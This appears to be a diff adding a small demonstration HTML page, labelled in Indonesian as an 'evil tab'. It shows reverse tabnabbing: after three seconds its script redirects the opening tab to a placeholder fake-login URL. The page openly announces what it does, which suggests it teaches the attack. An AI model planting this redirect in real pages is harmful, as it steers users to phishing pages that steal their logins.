@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tab Jahat</title>
+  <script>
+    setTimeout(() => {
+      if (window.opener) {
+        window.opener.location = "https://example.com/fake-login";
+      }
+    }, 3000);
+  </script>
+</head>
+<body>
+  <h2>Ini halaman jahat 😈</h2>
+  <p>Setelah 3 detik, kami akan mengubah tab asal!</p>
+</body>
+</html>
